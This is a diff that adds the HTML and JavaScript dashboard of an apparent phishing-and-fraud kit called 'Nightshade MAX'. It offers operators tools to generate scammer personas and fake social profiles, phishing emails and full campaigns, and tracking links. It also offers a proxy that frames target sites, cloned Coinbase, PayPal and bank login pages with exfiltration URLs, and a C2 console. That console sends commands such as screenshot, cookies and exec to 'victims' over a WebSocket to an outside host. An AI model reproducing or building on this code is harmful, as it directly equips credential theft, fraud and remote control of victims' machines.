@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nightshade MAX · Unified Offensive SaaS</title>
+<link rel="stylesheet" href="/styles.css">
+<style>
+  /* Additional SaaS-style enhancements */
+  .tab-btn { background: transparent; border: none; color: #9ca3af; padding: 0.75rem 1.25rem; font-size: 0.9rem; font-weight: 600; cursor: pointer; border-bottom: 2px solid transparent; transition: 0.2s; }
+  .tab-btn.active { color: #f72585; border-bottom-color: #f72585; }
+  .tab-content { display: none; animation: fadeIn 0.3s; }
+  .tab-content.active { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; }
+  .stat-card { background: #13161e; border: 1px solid #1f2330; border-radius: 0.75rem; padding: 1.5rem; text-align: center; }
+  .stat-card .value { font-size: 2rem; font-weight: 700; color: #f72585; }
+  iframe { width: 100%; height: 70vh; border: 1px solid #1f2330; border-radius: 0.75rem; background: #fff; }
+  pre { background: #0d0f15; border: 1px solid #1f2330; border-radius: 0.5rem; padding: 1rem; overflow: auto; max-height: 300px; font-size: 0.85rem; color: #4ade80; }
+</style>
+</head>
+<body class="bg-black text-white flex">
+<!-- Sidebar (consistent with platform) -->
+<nav class="w-64 bg-gray-900 min-h-screen p-4">
+  <h2 class="text-xl text-red-500 mb-4">NIGHTSHADE MAX</h2>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="dashboard">📊 Dashboard</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="persona">🪪 Persona Forge X</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="campaign">🚀 Auto‑Campaign</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="email">✉️ Email Gen</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="analyzer">🔍 Target Analyzer</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="links">🔗 Link Maker</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="proxy">🕶️ Shadow Proxy</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="c2">🕹️ C2 Commander</a>
+  <a href="#" class="tab-btn block w-full text-left" data-tab="scamgen">🛠️ Scam Gen</a>
+  <a href="#" class="tab-btn block w-full text-left text-red-300 mt-4" id="logoutBtn">🚪 Logout</a>
+</nav>
+
+<!-- Main Content -->
+<main class="flex-1 p-6 overflow-y-auto" style="height:100vh;">
+  <!-- Dashboard Tab -->
+  <div id="tab-dashboard" class="tab-content active">
+    <h1 class="text-2xl mb-4">Operational Dashboard</h1>
+    <div class="grid-3 mb-4">
+      <div class="stat-card"><div class="value" id="activeVictims">0</div><div class="text-sm text-gray-400">Active Victims</div></div>
+      <div class="stat-card"><div class="value" id="exfilEvents">0</div><div class="text-sm text-gray-400">Exfil Events</div></div>
+      <div class="stat-card"><div class="value" id="campaigns">0</div><div class="text-sm text-gray-400">Campaigns Generated</div></div>
+    </div>
+    <button id="refreshStats" class="bg-red-700 px-4 py-2 rounded">Refresh Stats</button>
+  </div>
+
+  <!-- Persona Forge X Tab -->
+  <div id="tab-persona" class="tab-content">
+    <h1 class="text-2xl mb-4">🪪 Persona Forge X</h1>
+    <div class="grid-3 mb-4">
+      <div class="card p-4">
+        <h3 class="text-red-400">Scammer Persona</h3>
+        <button id="genPersonaBtn" class="bg-red-700 px-4 py-2 rounded w-full mt-2">Generate</button>
+        <pre id="personaJson" class="mt-3 hidden"></pre>
+        <button id="copyPersonaBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded hidden">Copy JSON</button>
+      </div>
+      <div class="card p-4">
+        <h3 class="text-red-400">Profile HTML Page</h3>
+        <button id="genProfileBtn" class="bg-red-700 px-4 py-2 rounded w-full mt-2">Generate</button>
+        <textarea id="profileHtml" rows="8" class="bg-gray-900 p-2 rounded mt-3 w-full hidden"></textarea>
+        <button id="copyProfileBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded hidden">Copy</button>
+      </div>
+      <div class="card p-4">
+        <h3 class="text-red-400">Social Profile</h3>
+        <button id="genSocialBtn" class="bg-red-700 px-4 py-2 rounded w-full mt-2">Generate LinkedIn</button>
+        <textarea id="socialHtml" rows="8" class="bg-gray-900 p-2 rounded mt-3 w-full hidden"></textarea>
+        <button id="copySocialBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded hidden">Copy</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Auto-Campaign Tab -->
+  <div id="tab-campaign" class="tab-content">
+    <h1 class="text-2xl mb-4">🚀 Auto‑Smart Campaign</h1>
+    <div class="card p-4">
+      <input type="url" id="autoSmartTarget" placeholder="https://target.com/login" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="autoSmartBtn" class="bg-red-700 px-4 py-2 rounded">Generate Full Campaign</button>
+      <div id="autoSmartResult" class="hidden mt-3">
+        <pre id="autoSmartJson"></pre>
+        <button id="copyAutoSmartBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded">Copy JSON</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Email Generator Tab -->
+  <div id="tab-email" class="tab-content">
+    <h1 class="text-2xl mb-4">✉️ Phishing Email Generator</h1>
+    <div class="card p-4">
+      <input type="url" id="emailTargetInput" placeholder="Target URL" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="genEmailBtn" class="bg-red-700 px-4 py-2 rounded">Generate Email</button>
+      <textarea id="emailOutput" rows="10" class="bg-gray-900 p-3 rounded mt-3 w-full hidden"></textarea>
+      <button id="copyEmailBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded hidden">Copy</button>
+    </div>
+  </div>
+
+  <!-- Target Analyzer Tab -->
+  <div id="tab-analyzer" class="tab-content">
+    <h1 class="text-2xl mb-4">🔍 Smart Target Analyzer</h1>
+    <div class="card p-4">
+      <input type="url" id="targetInput" placeholder="https://target.com/login" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="genInstructionsBtn" class="bg-red-700 px-4 py-2 rounded">Analyze & Generate Playbook</button>
+      <pre id="instructionsOutput" class="mt-3 hidden"></pre>
+    </div>
+  </div>
+
+  <!-- Link Maker Tab -->
+  <div id="tab-links" class="tab-content">
+    <h1 class="text-2xl mb-4">🔗 Tracking Link Maker</h1>
+    <div class="card p-4">
+      <input type="url" id="linkTargetUrl" placeholder="Target Phishing URL" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="createLinkBtn" class="bg-red-700 px-4 py-2 rounded">Create Tracking Link</button>
+      <div id="linkResult" class="hidden mt-3">
+        <p><strong>Tracking URL:</strong> <span id="trackingUrl" class="text-green-300"></span></p>
+        <p><strong>Short Link:</strong> <span id="shortUrl" class="text-green-300"></span></p>
+        <button id="copyTrackingBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded mr-2">Copy Tracking</button>
+        <button id="copyShortBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded">Copy Short</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Shadow Proxy Tab -->
+  <div id="tab-proxy" class="tab-content">
+    <h1 class="text-2xl mb-4">🕶️ Shadow Proxy</h1>
+    <div class="card p-4 mb-4">
+      <input type="url" id="proxyTargetUrl" placeholder="https://target.com" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="launchProxyBtn" class="bg-red-700 px-4 py-2 rounded">Launch Proxy</button>
+    </div>
+    <iframe id="proxyFrame" class="hidden"></iframe>
+  </div>
+
+  <!-- C2 Commander Tab -->
+  <div id="tab-c2" class="tab-content">
+    <h1 class="text-2xl mb-4">🕹️ C2 Commander</h1>
+    <div class="card p-4">
+      <select id="victimSelect" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3"></select>
+      <input type="text" id="cmdInput" placeholder="Command (screenshot, cookies, exec:...)" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="sendCmdBtn" class="bg-red-700 px-4 py-2 rounded">Send</button>
+      <div id="responseLog" class="mt-3 bg-gray-900 p-3 rounded max-h-48 overflow-y-auto text-green-300 text-sm"></div>
+    </div>
+  </div>
+
+  <!-- Scam Generator Tab -->
+  <div id="tab-scamgen" class="tab-content">
+    <h1 class="text-2xl mb-4">🛠️ Scam Page Generator</h1>
+    <div class="card p-4">
+      <select id="scamType" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+        <option value="coinbase-phish">Coinbase Wallet</option>
+        <option value="paypal-phish">PayPal Login</option>
+        <option value="tech-support">Tech Support Popup</option>
+        <option value="bank-login">Bank Login</option>
+      </select>
+      <input type="url" id="scamExfilUrl" placeholder="Exfil URL (leave empty for default)" class="w-full p-2 bg-gray-800 border border-gray-700 rounded mb-3">
+      <button id="genScamBtn" class="bg-red-700 px-4 py-2 rounded">Generate</button>
+      <textarea id="scamOutput" rows="10" class="bg-gray-900 p-3 rounded mt-3 w-full hidden"></textarea>
+      <button id="copyScamBtn" class="bg-gray-600 px-3 py-1 mt-2 rounded hidden">Copy</button>
+    </div>
+  </div>
+</main>
+
+<script>
+// ==================== Auth & Navigation ====================
+const token = localStorage.getItem('auth_token');
+if (!token) location.href = '/'; // redirect to login
+
+// Tab switching
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', (e) => {
+    e.preventDefault();
+    const tab = btn.dataset.tab;
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.getElementById(`tab-${tab}`).classList.add('active');
+    // Init specific tab data if needed
+    if (tab === 'dashboard') refreshStats();
+    if (tab === 'c2') loadVictims();
+  });
+});
+
+// API helper
+async function api(url, method='GET', body) {
+  const res = await fetch(url, {
+    method,
+    headers: { 'Content-Type':'application/json', 'x-auth-token': token },
+    body: body ? JSON.stringify(body) : undefined
+  });
+  if (!res.ok) throw new Error(await res.text());
+  return res.json();
+}
+
+// ==================== Dashboard ====================
+async function refreshStats() {
+  try {
+    const stats = await api('/api/stats');
+    document.getElementById('activeVictims').innerText = stats.activeVictims || 0;
+    document.getElementById('exfilEvents').innerText = stats.exfilEvents || 0;
+    document.getElementById('campaigns').innerText = stats.campaigns?.generated || 0;
+  } catch(e) { console.error(e); }
+}
+document.getElementById('refreshStats')?.addEventListener('click', refreshStats);
+
+// ==================== Persona Forge ====================
+document.getElementById('genPersonaBtn')?.addEventListener('click', async () => {
+  const data = await api('/api/darkpersona/generate');
+  document.getElementById('personaJson').innerText = JSON.stringify(data, null, 2);
+  document.getElementById('personaJson').classList.remove('hidden');
+  document.getElementById('copyPersonaBtn').classList.remove('hidden');
+});
+document.getElementById('copyPersonaBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('personaJson').innerText);
+  alert('Copied');
+});
+
+document.getElementById('genProfileBtn')?.addEventListener('click', async () => {
+  const res = await fetch('/api/darkpersona/html', { headers: { 'x-auth-token': token } });
+  const html = await res.text();
+  document.getElementById('profileHtml').value = html;
+  document.getElementById('profileHtml').classList.remove('hidden');
+  document.getElementById('copyProfileBtn').classList.remove('hidden');
+});
+document.getElementById('copyProfileBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('profileHtml').value);
+  alert('Copied');
+});
+
+document.getElementById('genSocialBtn')?.addEventListener('click', async () => {
+  const res = await fetch('/api/darkpersona/social-profile', { headers: { 'x-auth-token': token } });
+  const html = await res.text();
+  document.getElementById('socialHtml').value = html;
+  document.getElementById('socialHtml').classList.remove('hidden');
+  document.getElementById('copySocialBtn').classList.remove('hidden');
+});
+document.getElementById('copySocialBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('socialHtml').value);
+  alert('Copied');
+});
+
+// ==================== Auto-Campaign ====================
+document.getElementById('autoSmartBtn')?.addEventListener('click', async () => {
+  const target = document.getElementById('autoSmartTarget').value.trim();
+  if(!target) return;
+  const data = await api('/api/darkpersona/auto-smart', 'POST', {target});
+  document.getElementById('autoSmartJson').innerText = JSON.stringify(data, null, 2);
+  document.getElementById('autoSmartResult').classList.remove('hidden');
+  document.getElementById('copyAutoSmartBtn').classList.remove('hidden');
+});
+document.getElementById('copyAutoSmartBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('autoSmartJson').innerText);
+  alert('Copied');
+});
+
+// ==================== Email Generator ====================
+document.getElementById('genEmailBtn')?.addEventListener('click', async () => {
+  const target = document.getElementById('emailTargetInput').value.trim();
+  if(!target) return;
+  const data = await api(`/api/darkpersona/email?target=${encodeURIComponent(target)}`);
+  document.getElementById('emailOutput').value = data.email;
+  document.getElementById('emailOutput').classList.remove('hidden');
+  document.getElementById('copyEmailBtn').classList.remove('hidden');
+});
+document.getElementById('copyEmailBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('emailOutput').value);
+  alert('Copied');
+});
+
+// ==================== Target Analyzer ====================
+document.getElementById('genInstructionsBtn')?.addEventListener('click', async () => {
+  const target = document.getElementById('targetInput').value.trim();
+  if(!target) return;
+  const data = await api('/api/darkpersona/instructions', 'POST', {target});
+  document.getElementById('instructionsOutput').innerText = data.instructions;
+  document.getElementById('instructionsOutput').classList.remove('hidden');
+});
+
+// ==================== Link Maker ====================
+document.getElementById('createLinkBtn')?.addEventListener('click', async () => {
+  const targetUrl = document.getElementById('linkTargetUrl').value.trim();
+  if(!targetUrl) return;
+  const data = await api('/api/link/create', 'POST', {targetUrl});
+  document.getElementById('trackingUrl').innerText = data.trackingUrl;
+  document.getElementById('shortUrl').innerText = data.shortUrl;
+  document.getElementById('linkResult').classList.remove('hidden');
+  document.getElementById('copyTrackingBtn').onclick = () => { navigator.clipboard.writeText(data.trackingUrl); alert('Copied'); };
+  document.getElementById('copyShortBtn').onclick = () => { navigator.clipboard.writeText(data.shortUrl); alert('Copied'); };
+});
+
+// ==================== Shadow Proxy ====================
+document.getElementById('launchProxyBtn')?.addEventListener('click', () => {
+  const target = document.getElementById('proxyTargetUrl').value.trim();
+  if(!target) return;
+  const frame = document.getElementById('proxyFrame');
+  frame.src = `/proxy?target=${encodeURIComponent(target)}`;
+  frame.classList.remove('hidden');
+});
+
+// ==================== C2 Commander ====================
+let c2Socket = null;
+async function loadVictims() {
+  const victims = await api('/api/victims');
+  const sel = document.getElementById('victimSelect');
+  sel.innerHTML = victims.map(v => `<option value="${v.id}">${v.id} - ${v.ua?.substring(0,50)}</option>`).join('');
+}
+function connectC2() {
+  if (c2Socket) c2Socket.close();
+  c2Socket = new WebSocket('wss://nightshade.cloutscape.org/c2');
+  c2Socket.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg.type === 'command_response') {
+      document.getElementById('responseLog').innerHTML += `<p>> ${msg.data.data}</p>`;
+    }
+  };
+  c2Socket.onclose = () => setTimeout(connectC2, 5000);
+}
+connectC2();
+document.getElementById('sendCmdBtn')?.addEventListener('click', () => {
+  const id = document.getElementById('victimSelect').value;
+  const cmd = document.getElementById('cmdInput').value.trim();
+  if (!id || !cmd) return;
+  c2Socket.send(JSON.stringify({ type: 'cmd', id, command: cmd }));
+  document.getElementById('responseLog').innerHTML += `<p style="color:#f72585">Sent: ${cmd}</p>`;
+});
+
+// ==================== Scam Generator ====================
+document.getElementById('genScamBtn')?.addEventListener('click', async () => {
+  const type = document.getElementById('scamType').value;
+  const exfilUrl = document.getElementById('scamExfilUrl').value || undefined;
+  const data = await api('/api/scam/generate', 'POST', {type, overrides: {exfilUrl}});
+  document.getElementById('scamOutput').value = data.html;
+  document.getElementById('scamOutput').classList.remove('hidden');
+  document.getElementById('copyScamBtn').classList.remove('hidden');
+});
+document.getElementById('copyScamBtn')?.addEventListener('click', () => {
+  navigator.clipboard.writeText(document.getElementById('scamOutput').value);
+  alert('Copied');
+});
+
+// Logout
+document.getElementById('logoutBtn')?.addEventListener('click', () => {
+  localStorage.clear();
+  location.href = '/';
+});
+
+// Refresh stats on load
+refreshStats();
+loadVictims();
+</script>
+</body>
+</html>
